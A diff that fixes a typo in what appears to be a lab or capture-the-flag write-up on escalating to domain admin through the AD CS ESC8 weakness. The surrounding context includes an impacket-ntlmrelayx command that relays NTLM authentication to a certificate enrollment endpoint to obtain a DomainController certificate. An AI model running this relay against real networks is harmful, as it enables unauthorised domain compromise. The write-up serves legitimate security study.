@@ -290,7 +290,7 @@ It is vulnerable to ESC8
 
 ## ESC8 leads to domain admin!
 
-I can target the DomainController template since it is enabled and allowed client authentication, and it has enrolkments rights for the domain controller
+I can target the DomainController template since it is enabled and allowed client authentication, and it has enrollments rights for the domain controller
 
 ```python
 impacket-ntlmrelayx --adcs -smb2support --template DomainController -t http://shadow.gate/certsrv/certfnsh.asp 
